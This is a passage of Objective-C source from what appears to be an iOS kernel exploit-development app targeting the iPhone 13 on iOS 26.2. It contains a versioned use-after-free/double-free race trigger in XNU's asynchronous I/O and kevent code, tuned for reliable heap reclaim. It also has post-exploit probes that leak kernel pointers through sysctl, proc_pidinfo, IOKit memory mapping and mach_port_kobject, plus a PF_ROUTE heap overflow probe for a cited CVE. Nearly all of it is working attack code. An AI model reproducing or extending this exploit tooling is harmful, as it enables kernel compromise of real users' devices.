    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found via post-close buffer remap ***"];
    }
    if (totalFreePatterns > 0) {
        [self appendLog:@"  *** FINDING: Zone free-patterns visible via stale/remapped buffer (stale reference indicator) ***"];
    }
    if (totalStaleReads > 0 && totalLeaks == 0 && totalFreePatterns == 0) {
        [self appendLog:@"  INFO: Buffer contents changed during close but no kernel addresses found."];
        [self appendLog:@"    Indicates kernel modifies the shared mapping during teardown."];
    }

    [self appendLog:@"====== Sub-phase E3 Complete ======"];
}

// ---- XNU AIO Kevent Double-Free Trigger ----
// CVE-2026-XXXX: lio_listio() registers kevent AFTER enqueue,
// racing aio_return() frees entry → dangling knote → double-free.
// CPU-affinity LIFO reclaim achieves ~70% reliability on A15.
//
// Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
// Leaks kernel heap address via kevent64 ident field.

#pragma mark - Phase 0: Multi-Vector Kernel Pointer Probe

// v72 Phase 0/D: Pre-exploit zone-warming probes + post-exploit leak probe.
// Tests four independent channels; each is non-destructive and
// failure in one does not block the others.

// Stricter kernel pointer validation for A15/iOS 26.2:
// Real kernel pointers are in 0xFFFFFE00... or 0xFFFFFF80... ranges.
// Values with hi32 == 0xFFFFFFFF are usually sentinels/canaries, not real pointers.
// Values with low 32 bits < 0x1000 are too small for a real heap offset.
- (BOOL)isRealKernelPointer:(uint64_t)value {
    if (value == 0) return NO;
    uint32_t hi32 = (uint32_t)(value >> 32);
    uint32_t lo32 = (uint32_t)(value & 0xFFFFFFFF);

    // Must be in kernel address range
    if (value < 0xFFFFFE0000000000ULL) return NO;

    // Reject sentinel/canary patterns (0xFFFFFFFF high word + tiny payload)
    if (hi32 == 0xFFFFFFFF && lo32 < 0x1000) return NO;

    // Accept: 0xFFFFFE00, 0xFFFFFF80, 0xFFFFFF00
    if (hi32 == 0xFFFFFE00 || hi32 == 0xFFFFFF80 || hi32 == 0xFFFFFF00) return YES;

    // Accept other values in the broad kernel range if they look like heap addresses
    if (lo32 >= 0x1000 && lo32 < 0xF0000000) return YES;

    return NO;
}

// Dump a buffer as hex, scanning for kernel pointer candidates.
// Returns array of @{@"offset": NSNumber, @"value": NSString} dicts.
- (NSArray<NSDictionary *> *)scanBufferForKernelPointers:(const uint8_t *)buf
                                                  length:(size_t)len
                                                   label:(NSString *)label {
    NSMutableArray *hits = [NSMutableArray array];
    if (!buf || len < 8) return hits;

    for (size_t off = 0; off + 8 <= len; off += 4) {
        uint64_t val = 0;
        memcpy(&val, buf + off, sizeof(val));
        if ([self isRealKernelPointer:val]) {
            [hits addObject:@{
                @"offset": @(off),
                @"value": [NSString stringWithFormat:@"0x%016llx", val]
            }];
        }
    }

    if (hits.count > 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0 %@: %lu kernel ptr candidates", label, (unsigned long)hits.count]];
        NSUInteger show = MIN(hits.count, 8);
        for (NSUInteger i = 0; i < show; i++) {
            NSDictionary *h = hits[i];
            // Show 32 bytes of context around the hit
            int64_t ctxOff = (int64_t)[h[@"offset"] integerValue] - 16;
            if (ctxOff < 0) ctxOff = 0;
            size_t ctxLen = (size_t)(len - (size_t)ctxOff);
            if (ctxLen > 32) ctxLen = 32;
            [self appendLog:[NSString stringWithFormat:@"  [%lu] off=%lu val=%@ ctx=%@",
                (unsigned long)i, (unsigned long)[h[@"offset"] integerValue], h[@"value"],
                [self hexPreview:(buf + ctxOff) length:ctxLen]]];
        }
    }
    return hits;
}

// Sub-test A: sysctl net.inet.tcp.info — CVE-2026-28867 auth bypass
- (void)subtestSysctlTcpInfo {
    [self appendLog:@"Phase0.A sysctl: creating TCP connection..."];

    int listenFd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenFd < 0) {
        [self appendLog:@"Phase0.A sysctl: socket() failed"];
        return;
    }

    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_len = sizeof(addr);

    if (bind(listenFd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: bind() failed: %s", strerror(errno)]];
        close(listenFd);
        return;
    }

    if (listen(listenFd, 1) < 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: listen() failed: %s", strerror(errno)]];
        close(listenFd);
        return;
    }

    socklen_t addrLen = sizeof(addr);
    if (getsockname(listenFd, (struct sockaddr *)&addr, &addrLen) < 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: getsockname() failed: %s", strerror(errno)]];
        close(listenFd);
        return;
    }

    int connFd = socket(AF_INET, SOCK_STREAM, 0);
    if (connFd < 0) {
        close(listenFd);
        return;
    }

    if (connect(connFd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: connect() failed: %s", strerror(errno)]];
        close(connFd); close(listenFd);
        return;
    }

    int accepted = accept(listenFd, NULL, NULL);
    if (accepted < 0) {
        close(connFd); close(listenFd);
        return;
    }

    // Build info_tuple for our connection
    struct {
        uint8_t  proto;
        uint8_t  padding[3];
        struct sockaddr_in local;
        struct sockaddr_in remote;
    } tuple = {};
    tuple.proto = IPPROTO_TCP;

    socklen_t localLen = sizeof(tuple.local);
    socklen_t remoteLen = sizeof(tuple.remote);
    getsockname(accepted, (struct sockaddr *)&tuple.local, &localLen);
    getpeername(accepted, (struct sockaddr *)&tuple.remote, &remoteLen);

    [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: local=%d remote=%d",
        ntohs(tuple.local.sin_port), ntohs(tuple.remote.sin_port)]];

    // Query tcp.info (CVE-2026-28867: no permission check on the socket)
    size_t infoLen = 0;
    int ret = sysctlbyname("net.inet.tcp.info", NULL, &infoLen, &tuple, sizeof(tuple));
    if (ret != 0 || infoLen == 0) {
        // ENOMEM is expected on the first call (buffer too small)
        if (errno != ENOMEM || infoLen == 0) {
            [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: size query failed ret=%d errno=%d", ret, errno]];
            close(connFd); close(accepted); close(listenFd);
            return;
        }
    }

    [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: infoLen=%zu", infoLen]];

    // Allocate and fetch
    uint8_t *buf = (uint8_t *)calloc(1, infoLen + 64); // extra in case of variance
    if (!buf) {
        close(connFd); close(accepted); close(listenFd);
        return;
    }
    if (sysctlbyname("net.inet.tcp.info", buf, &infoLen, &tuple, sizeof(tuple)) == 0) {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: fetched %zu bytes", infoLen]];
        // Hex dump first 256 bytes (or full buffer if smaller)
        size_t dumpLen = MIN(infoLen, (size_t)256);
        [self appendLog:[NSString stringWithFormat:@"Phase0.A buffer[0..%zu]: %@",
            dumpLen - 1, [self hexPreview:buf length:dumpLen]]];
        [self scanBufferForKernelPointers:buf length:infoLen label:@"sysctl.tcp"];
    } else {
        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: fetch failed: %s", strerror(errno)]];
    }
    free(buf);
    close(connFd); close(accepted); close(listenFd);
}

// Sub-test B: proc_pidinfo — safe pre-exploit scan (no PID 0, small buffers)
- (void)subtestProcPidinfo {
    ProcPidinfoFn f = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
    if (!f) { [self appendLog:@"Phase0.B: proc_pidinfo not available"]; return; }

    // PID 0 (kernel_task) is DANGEROUS — causes zone disturbance → AIO race fails
    int pids[] = {1, getpid()};
    const char *pidLabels[] = {"launchd", "self"};
    size_t bufSize = 2048;  // small buffer — avoid zone magazine disturbance

    for (int pi = 0; pi < 2; pi++) {
        int pid = pids[pi];
        uint8_t *buf = (uint8_t *)calloc(1, bufSize);
        if (!buf) continue;

        int tested = 0;
        for (int flavor = 1; flavor <= 8; flavor++) {
            memset(buf, 0, bufSize);
            int ret = f(pid, flavor, 0, buf, (uint32_t)bufSize);
            if (ret <= 0 || ret >= (int)bufSize) continue;
            tested++;
            NSArray *hits = [self scanBufferForKernelPointers:buf length:(size_t)ret
                label:[NSString stringWithFormat:@"pidinfo.f%d.p%d", flavor, pid]];
            if (hits.count > 0) {
                size_t dumpLen = MIN((size_t)ret, (size_t)256);
                [self appendLog:[NSString stringWithFormat:@"Phase0.B *** HIT f=%d pid=%d ret=%d: %@",
                    flavor, pid, ret, [self hexPreview:buf length:dumpLen]]];
            }
        }
        [self appendLog:[NSString stringWithFormat:@"Phase0.B pid=%d(%s): %d/8 flavors returned data", pid, pidLabels[pi], tested]];
        free(buf);
    }
}

// Sub-test B2: sysctl KERN_PROCARGS2 — known uninitialized kernel memory leak vector
- (void)subtestKernProcargs {
    [self appendLog:@"Phase0.B2 KERN_PROCARGS2: probing..."];

    int mib[] = {CTL_KERN, KERN_PROCARGS2, 0};
    size_t bufSize = 8192;  // moderate buffer — zone-safe
    for (int pi = 0; pi < 2; pi++) {
        mib[2] = (pi == 0) ? getpid() : 1;
        uint8_t *buf = (uint8_t *)calloc(1, bufSize);
        if (!buf) continue;

        size_t len = bufSize;
        if (sysctl(mib, 3, buf, &len, NULL, 0) == 0 && len > 0) {
            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: %zu bytes", mib[2], len]];
            [self scanBufferForKernelPointers:buf length:len
                label:[NSString stringWithFormat:@"kern.procargs2.p%d", mib[2]]];
        } else {
            [self appendLog:[NSString stringWithFormat:@"Phase0.B2 pid=%d: failed (errno=%d)", mib[2], errno]];
        }
        free(buf);
    }
}

// Sub-test D (was C): Non-FastPath IOKit service enumeration + memory mapping
- (void)subtestIOKitEnumeration {
    if (![self loadIOKitSymbols]) {
        [self appendLog:@"Phase0.C IOKit: symbols unavailable"];
        return;
    }
    if (!sIOConnectMapMemory64) {
        [self appendLog:@"Phase0.C IOKit: IOConnectMapMemory64 unavailable"];
        return;
    }

    [self appendLog:@"Phase0.C IOKit: enumerating services..."];

    // Try a set of IOKit service names that might support memory mapping
    const char *services[] = {
        "IOSurfaceRoot",
        "IOHIDEventService",
        "AppleJPEGDriver",
        "IOGPU",
        "IOGraphicsAccelerator2",
        "IONetworkingFamily",
        "IOAudioControl",
        "IOSerialBSDClient",
        NULL
    };

    int tested = 0;
    for (int s = 0; services[s]; s++) {
        CFMutableDictionaryRef match = sIOServiceMatching(services[s]);
        if (!match) continue;

        io_iterator_t iter = MACH_PORT_NULL;
        if (sIOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter) != KERN_SUCCESS) continue;

        io_service_t svc = MACH_PORT_NULL;
        int svcCount = 0;
        while ((svc = sIOIteratorNext(iter)) != MACH_PORT_NULL && svcCount < 3) {
            svcCount++; tested++;

            // Try open types 0, 1, 2
            for (int openType = 0; openType <= 2; openType++) {
                io_connect_t conn = MACH_PORT_NULL;
                kern_return_t openKr = sIOServiceOpen(svc, mach_task_self_, openType, &conn);
                if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) continue;

                // Try map memory types 0..3
                for (uint32_t memType = 0; memType <= 3; memType++) {
                    mach_vm_address_t mapAddr = 0;
                    mach_vm_size_t mapSize = 0;
                    kern_return_t mapKr = sIOConnectMapMemory64(conn, memType, mach_task_self(), &mapAddr, &mapSize, 1);
                    if (mapKr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0 && mapSize < (1024 * 1024)) {
                        size_t scanLen = MIN((size_t)mapSize, (size_t)4096);
                        const uint8_t *scanBase = (const uint8_t *)(uintptr_t)mapAddr;
                        NSArray *hits = [self scanBufferForKernelPointers:scanBase length:scanLen
                            label:[NSString stringWithFormat:@"IOKit.%s(t=%d,m=%u)", services[s], openType, memType]];
                        if (hits.count > 0) {
                            [self appendLog:[NSString stringWithFormat:@"Phase0.C *** HIT: %s openType=%d memType=%u addr=0x%llx size=%llu ***",
                                services[s], openType, memType, mapAddr, mapSize]];
                        }
                        // Unmap
                        if (sIOConnectUnmapMemory64) {
                            sIOConnectUnmapMemory64(conn, memType, mach_task_self(), mapAddr);
                        } else {
                            vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
                        }
                    }
                }
                sIOServiceClose(conn);
            }
            sIOObjectRelease(svc);
        }
        sIOObjectRelease(iter);
    }
    [self appendLog:[NSString stringWithFormat:@"Phase0.C IOKit: tested %d service instances", tested]];
}

// Sub-test D: mach_port_kobject — try to get kernel object address from port
- (void)subtestMachPortKobject {
    [self appendLog:@"Phase0.D mach_port_kobject: probing..."];

    // mach_port_kobject is in libsystem_kernel.dylib
    typedef kern_return_t (*mach_port_kobject_fn)(mach_port_t, natural_t *, mach_vm_address_t *);
    mach_port_kobject_fn f = (mach_port_kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
    if (!f) {
        [self appendLog:@"Phase0.D: mach_port_kobject not available"];
        return;
    }

    // Try our own task port
    mach_port_t ports[] = {
        mach_task_self(),
        mach_thread_self(),
    };
    const char *names[] = {"task", "thread"};

    for (int i = 0; i < 2; i++) {
        natural_t objType = 0;
        mach_vm_address_t objAddr = 0;
        kern_return_t kr = f(ports[i], &objType, &objAddr);
        if (kr == KERN_SUCCESS && objAddr != 0) {
            [self appendLog:[NSString stringWithFormat:@"Phase0.D %s: type=%d addr=0x%llx",
                names[i], objType, objAddr]];
            if ([self isRealKernelPointer:objAddr]) {
                [self appendLog:[NSString stringWithFormat:@"Phase0.D *** HIT: %s kernel object at 0x%llx ***", names[i], objAddr]];
            }
        } else {
            [self appendLog:[NSString stringWithFormat:@"Phase0.D %s: kr=0x%x (%s)", names[i], kr, mach_error_string(kr)]];
        }
        if (i == 1) mach_port_deallocate(mach_task_self(), ports[1]); // release thread port
    }
}

// Phase 0 (pre-exploit): EMPTY — preserve pristine zone state
- (void)runPhase0Dummy {
    // v78: No probes. Keep zone state pristine for race reliability.
}

// Phase D (post-exploit): ALL leak probes — exploit done, zone disturbance irrelevant
- (void)runPostExploitLeakProbe {
    [self appendLog:@"\n=== Phase D v78: Post-Exploit Full Leak Probe ==="];

    [self appendLog:@"\n-- PhaseD.A: sysctl net.inet.tcp.info --"];
    @try { [self subtestSysctlTcpInfo]; }
    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.A exception: %@", e]]; }

    [self appendLog:@"\n-- PhaseD.B: proc_pidinfo scan --"];
    @try { [self subtestProcPidinfo]; }
    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.B exception: %@", e]]; }

    [self appendLog:@"\n-- PhaseD.B2: KERN_PROCARGS2 --"];
    @try { [self subtestKernProcargs]; }
    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.B2 exception: %@", e]]; }

    [self appendLog:@"\n-- PhaseD.C: IOKit enumeration --"];
    @try { [self subtestIOKitEnumeration]; }
    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.C exception: %@", e]]; }

    [self appendLog:@"\n-- PhaseD.D: mach_port_kobject --"];
    @try { [self subtestMachPortKobject]; }
    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"PhaseD.D exception: %@", e]]; }

    [self appendLog:@"\n=== Post-Exploit Leak Probe Complete ==="];
}

- (void)aioUafTapped {
    // v25: Strong re-entrancy guard — @synchronized only wraps debounce,
    // but static flag prevents any possibility of concurrent execution.
    static volatile int32_t _aioRunning = 0;
    if (!__sync_bool_compare_and_swap(&_aioRunning, 0, 1)) {
        [self appendLog:@"⚠ Already running — rejecting re-entrant call"];
        return;
    }

    @synchronized([ViewController class]) {
        static int64_t _aioLast = 0;
        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
        if (now - _aioLast < 3000) {
            _aioRunning = 0;
            [self appendLog:@"⚠ Debounced"];
            return;
        }
        _aioLast = now;
    }

    [self appendLog:@"\n========== AIO UAF v78 (SIGEV_KEVENT rcbs[0] — Knote Protects Entry) =========="];

    // ---- Phase 0 v78: Empty ----
    [self appendLog:@"\n--- Phase 0 v78: (empty) ---"];

    // Disable button to prevent double-tap
    dispatch_async(dispatch_get_main_queue(), ^{
        self.aioUafButton.enabled = NO;
        [self.aioUafButton setTitle:@"Running..." forState:UIControlStateNormal];
    });

    // Run exploit on background thread so UI stays responsive.
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {

    // v63: Single 64KB file, no F_NOCACHE (faithful v44/v58/v63 config).
    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v78.bin"];
    int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (fd < 0) {
        [self appendLog:@"FAIL: could not create file"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.aioUafButton.enabled = YES;
            [self.aioUafButton setTitle:@"AIO UAF v78" forState:UIControlStateNormal];
        });
        return;
    }
    {
        char fdata[65536];
        memset(fdata, 'V', sizeof(fdata));
        write(fd, fdata, sizeof(fdata));
    }
    [self appendLog:[NSString stringWithFormat:@"fd=%d(64KB) pid=%d uid=%d", fd, getpid(), getuid()]];

    uint64_t entryAddr = 0;
    // ---- Phase A v78: 7x prime → lio_listio tcb → racer(500us) → aio_read rcbs[0](SIGEV_KEVENT) + lio_listio rcbs[1..6] → wait → kevent64 ----
    [self appendLog:@"\n--- Phase A v78: 7x prime → lio_listio tcb → racer(500us) → rcbs[0](KEVENT) + batch rcbs[1..6] → wait → kevent64 ---"];

    bool phaseA_won = false;
    for (int attempt = 0; attempt < 10; attempt++) {
        [self appendLog:[NSString stringWithFormat:@"  attempt %d/10", attempt + 1]];

        struct v63_state st = {};
        st.fd = fd;

        pthread_t thr;
        pthread_create(&thr, NULL, v78_exploit_thread, &st);
        pthread_join(thr, NULL);

        if (st.err != 0) {
            [self appendLog:[NSString stringWithFormat:@"  kqueue() failed: %d", st.err]];
            continue;
        }

        [self appendLog:[NSString stringWithFormat:@"  freed=%d reclaimed=%d ret=%zd",
            st.freed, st.reclaimed, st.return_result]];

        if (st.freed != 2) {
            [self appendLog:[NSString stringWithFormat:@"  racer %s — retry",
                st.freed == 1 ? @"LOST (never won)" : @"LOST (worker won)"]];
            continue;
        }

        if (!st.reclaimed) {
            [self appendLog:@"  reclaim FAIL — retry"];
            continue;
        }

        // kevent64 fired IMMEDIATELY after reclaim in exploit thread
        [self appendLog:[NSString stringWithFormat:@"  Phase A kevent64(kq): nev=%d", st.nev]];

        int nev = st.nev;
        struct kevent64_s kev = st.kev;

        if (nev > 0) {
            [self appendLog:@"  *** Phase A DONE ***"];
            [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
                kev.ident, kev.filter, kev.flags, kev.fflags]];
            [self appendLog:[NSString stringWithFormat:@"  kev.data=0x%llx udata=0x%llx ext[0]=0x%llx ext[1]=0x%llx",
                kev.data, kev.udata, kev.ext[0], kev.ext[1]]];
            if (kev.ident != 0) {
                entryAddr = kev.ident;
            }
            phaseA_won = true;
            break;
        } else {
            [self appendLog:[NSString stringWithFormat:@"  Phase A kevent64 returned %d — retry", nev]];
        }
    }

    if (!phaseA_won) {
        [self appendLog:@"FAIL: Phase A could not trigger after 10 attempts"];
        goto cleanup;
    }

    [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];

    // ---- Phase C v78: Health check ----
    [self appendLog:@"\n--- Phase C v78: Health check ---"];
    {
        struct aiocb hc[4];
        char hcbuf[4][256];
        int hc_ok = 0;
        for (int i = 0; i < 4; i++) {
            memset(&hc[i], 0, sizeof(hc[i]));
            hc[i].aio_fildes = fd;
            hc[i].aio_buf = hcbuf[i];
            hc[i].aio_nbytes = 1;
            hc[i].aio_offset = 0;
            hc[i].aio_lio_opcode = LIO_READ;
            hc[i].aio_sigevent.sigev_notify = SIGEV_NONE;
            if (aio_read(&hc[i]) == 0) {
                while (aio_error(&hc[i]) == EINPROGRESS) usleep(100);
                aio_return(&hc[i]);
                hc_ok++;
            }
        }
        [self appendLog:[NSString stringWithFormat:@"  health check: %d/4 ok", hc_ok]];
    }

cleanup:
    close(fd);
    unlink(aioPath.UTF8String);
    [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
    [self appendLog:@"========== AIO UAF v78 Complete =========="];
            _aioRunning = 0;
            dispatch_async(dispatch_get_main_queue(), ^{
                self.aioUafButton.enabled = YES;
                [self.aioUafButton setTitle:@"AIO UAF v78" forState:UIControlStateNormal];
            });
        }  // @autoreleasepool
    });  // dispatch_async
}

// =======================================================================
// PF_ROUTE RTA_GENMASK Heap Overflow Probe (CVE-2026-20698)
// =======================================================================

- (void)pfRouteProbeTapped {
    static volatile int32_t _pfRunning = 0;
    if (!__sync_bool_compare_and_swap(&_pfRunning, 0, 1)) {
        [self appendLog:@"⚠ PF_ROUTE probe already running"];
        return;
    }

    @synchronized([ViewController class]) {
        static int64_t _pfLast = 0;
        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
        if (now - _pfLast < 3000) {
            _pfRunning = 0;
            [self appendLog:@"⚠ Debounced"];
            return;
        }
        _pfLast = now;
    }

    [self appendLog:@"\n============================================================"];
    [self appendLog:@"  CVE-2026-20698 v3 — PF_ROUTE Leak Probe"];
    [self appendLog:@"  Target: iOS 26.2 (xnu-12377.62.10) | iPhone 13 (A15)"];
    [self appendLog:@"  ISOLATED from AIO UAF: separate socket, no shared state"];
    [self appendLog:@"============================================================"];

    dispatch_async(dispatch_get_main_queue(), ^{
        self.pfRouteProbeButton.enabled = NO;
        [self.pfRouteProbeButton setTitle:@"Probing..." forState:UIControlStateNormal];
    });
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            [self runPFRouteProbe];
            _pfRunning = 0;
            dispatch_async(dispatch_get_main_queue(), ^{
                self.pfRouteProbeButton.enabled = YES;
                [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v3 Leak Probe" forState:UIControlStateNormal];
            });
        }
    });
}

static BOOL pf_scanForKernelPtr(const uint8_t *buf, size_t len, const char *label, NSMutableString *out) {
    int found = 0;
    for (size_t i = 0; i + 7 < len; i += 4) {
        uint64_t v = *(uint64_t*)(buf + i);
        if ((v >> 40) == 0xffffff || (v >> 40) == 0xfffffe) {
            if (found == 0) {
                [out appendFormat:@"  [%s] KERNEL POINTERS:\n", label];
            }
            [out appendFormat:@"    offset +%zu: 0x%016llx\n", i, v];
            found++;
            if (found >= 8) {
                [out appendFormat:@"    ... (%d+ total)\n", found];
                break;
            }
        }
    }
    if (found == 0) {
        [out appendFormat:@"  [%s] No kernel pointers found\n", label];
    }
    return (found > 0);
}

static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
                            void *respBuf, size_t respSize, ssize_t *outRead) {
    int fd = socket(PF_ROUTE, SOCK_RAW, 0);
    if (fd < 0) return -errno;

    char buf[2048];
    memset(buf, 0, sizeof(buf));
    struct pf_rt_msghdr *rtm = (struct pf_rt_msghdr *)buf;
    rtm->rtm_type = type;
    rtm->rtm_version = RTM_VERSION;
    rtm->rtm_seq = 1;
    rtm->rtm_addrs = addrs;
    if (sa_len > 0 && sas) {
        memcpy(buf + sizeof(*rtm), sas, sa_len);
    }
    rtm->rtm_msglen = sizeof(*rtm) + sa_len;

    ssize_t s = write(fd, buf, rtm->rtm_msglen);
    int write_err = (s < 0) ? errno : 0;

    *outRead = -1;
    if (s > 0 && respBuf && respSize > 0) {
        struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        *outRead = read(fd, respBuf, respSize);
    }
    close(fd);
    return write_err;
}

- (void)runPFRouteProbe {
    NSMutableString *log = [NSMutableString string];

    // ============================================================
    // TEST 1: Safe baseline — RTM_GET DST-only (no GENMASK)
    // ============================================================
    [log appendString:@"\n--- TEST 1: Safe Baseline (RTM_GET + DST only, no GENMASK) ---\n"];

    struct sockaddr_in sin_dst;
    memset(&sin_dst, 0, sizeof(sin_dst));
    sin_dst.sin_family = AF_INET;
    sin_dst.sin_len = sizeof(sin_dst);
    sin_dst.sin_addr.s_addr = inet_addr("8.8.8.8");

    char resp[4096];
    ssize_t rlen = 0;
    int err = pf_sendRouteMsg(RTM_GET, RTA_DST, &sin_dst, sizeof(sin_dst),
                               resp, sizeof(resp), &rlen);
    [log appendFormat:@"  write() err=%d, read()=%zd bytes\n", err, rlen];

    if (rlen > 0) {
        struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
        [log appendFormat:@"  response: type=%u errno=%d addrs=0x%x msglen=%u\n",
            r->rtm_type, r->rtm_errno, r->rtm_addrs, r->rtm_msglen];
        // hex dump first 128 bytes
        [log appendString:@"  hex[0..128]: "];
        for (int i = 0; i < 128 && i < rlen; i++) {
            [log appendFormat:@"%02x", (unsigned char)resp[i]];
            if ((i+1) % 64 == 0) [log appendString:@"\n              "];
        }
        [log appendString:@"\n"];
        pf_scanForKernelPtr((uint8_t*)resp, rlen, "baseline", log);
    } else {
        [log appendFormat:@"  PF_ROUTE may be restricted on this device (errno=%d)\n",
            rlen < 0 ? errno : 0];
    }

    // ============================================================
    // TEST 2: Safe GENMASK sa_len sweep (≤32 only — NO bounds-safety trigger)
    // ============================================================
    [log appendString:@"\n--- TEST 2: Safe GENMASK sweep (sa_len=4..32, AF_INET) ---\n"];
    [log appendString:@"  NO values > 32 — avoiding -fbounds-safety BRK.\n"];
    // We know from v1 crash: AF_INET buffer=32bytes, sa_len=33 triggers BRK.
    // Safe range: sa_len 4..32. Focus on kernel pointer leak in responses.

    int safeLens[] = {4, 8, 12, 16, 20, 24, 28, 32};
    int numSafelens = sizeof(safeLens) / sizeof(safeLens[0]);
    int totalKptrCount = 0;
    int survivingLens = 0;

    for (int ti = 0; ti < numSafelens; ti++) {
        int gm_len = safeLens[ti];

        char sa_buf[256];
        memset(sa_buf, 0, sizeof(sa_buf));
        struct sockaddr_in *dst = (struct sockaddr_in *)sa_buf;
        dst->sin_family = AF_INET;
        dst->sin_len = sizeof(*dst);
        dst->sin_addr.s_addr = inet_addr("8.8.8.8");
        int off = sizeof(*dst);

        sa_buf[off] = gm_len;
        sa_buf[off+1] = AF_INET;
        // Fill with unique pattern per offset: A0..AF repeating
        for (int b = 2; b < gm_len && b < 255; b++) {
            sa_buf[off+b] = (unsigned char)(0xA0 + (b & 0x0F));
        }
        int padded = (gm_len + 3) & ~3;
        if (padded < 4) padded = 4;
        off += padded;

        memset(resp, 0, sizeof(resp));
        rlen = 0;
        err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, sa_buf, off,
                               resp, sizeof(resp), &rlen);

        if (rlen > 0) {
            survivingLens++;
            struct pf_rt_msghdr *r = (struct pf_rt_msghdr *)resp;
            // Calculate expected response size: rt_msghdr + DST(16) + GENMASK(padded)
            int expectedMin = (int)sizeof(struct pf_rt_msghdr) + 16 + padded;
            int extraBytes = (int)rlen - expectedMin;
            NSString *tag = [NSString stringWithFormat:@"gm%d", gm_len];
            BOOL hasKptr = pf_scanForKernelPtr((uint8_t*)resp, rlen, tag.UTF8String, log);
            if (hasKptr) totalKptrCount++;
            [log appendFormat:@"  sa=%d: rd=%zd exp~%d extra=%d kptr=%s err=%d\n",
                gm_len, rlen, expectedMin, extraBytes,
                hasKptr ? "YES" : "no", r->rtm_errno];
            // If extra > 0, dump the extra bytes
            if (extraBytes > 0 && extraBytes < 128) {
                [log appendFormat:@"    extra[%d]: ", extraBytes];
                for (int ei = expectedMin; ei < (int)rlen && ei < expectedMin + 64; ei++)
                    [log appendFormat:@"%02x", (unsigned char)resp[ei]];
                [log appendString:@"\n"];
            }
        } else {
            [log appendFormat:@"  sa=%d: write=%d read=%zd\n", gm_len, err, rlen];
        }
    }

    [log appendFormat:@"  Safe sweep: %d/%d responded, %d with kptr in response\n",
        survivingLens, numSafelens, totalKptrCount];

    // ============================================================
    // TEST 3: Safe GENMASK leak — vary only sa_len (4..32, AF_INET only)
    //   REMOVED: cross-family enumeration (v2 crash: non-AF_INET
    //   families have smaller genmask buffers — sa_len=16 exceeds
    //   bounds-safety limit for AF_UNIX, AF_LINK, AF_INET6, etc.)
    //   AF_INET is the ONLY family with 32-byte genmask buffer.
    // ============================================================
    [log appendString:@"\n--- TEST 3: Safe GENMASK Leak Focus (AF_INET only, multiple queries) ---\n"];
    [log appendString:@"  Repeated RTM_GET queries with sa_len=32, scanning for kptr in response\n"];

    {
        int kptrHits = 0;
        int queryCount = 20;
        for (int qi = 0; qi < queryCount; qi++) {
            char qb[256];
            memset(qb, 0, sizeof(qb));
            struct sockaddr_in *qd = (struct sockaddr_in *)qb;
            qd->sin_family = AF_INET;
            qd->sin_len = sizeof(*qd);
            qd->sin_addr.s_addr = htonl(0x08080800 + qi);  // 8.8.8.0..8.8.8.19
            int qo = sizeof(*qd);

            qb[qo] = 28;       // sa_len = 28 (safe: 32-byte buffer, 28 < 32)
            qb[qo+1] = AF_INET;
            // Fill with 0xAA pattern (invalid mask → early error return,
            // preventing bounds-safety violation from processing all bytes)
            for (int b = 2; b < 28 && b < 255; b++) {
                qb[qo+b] = (unsigned char)(0xA0 + (b & 0x0F));
            }
            int qpad = (28 + 3) & ~3;
            qo += qpad;

            memset(resp, 0, sizeof(resp));
            rlen = 0;
            err = pf_sendRouteMsg(RTM_GET, RTA_DST | RTA_GENMASK, qb, qo,
                                   resp, sizeof(resp), &rlen);
            if (rlen > 0) {
                NSString *qtag = [NSString stringWithFormat:@"multi%d", qi];
                if (pf_scanForKernelPtr((uint8_t*)resp, rlen, qtag.UTF8String, log)) kptrHits++;
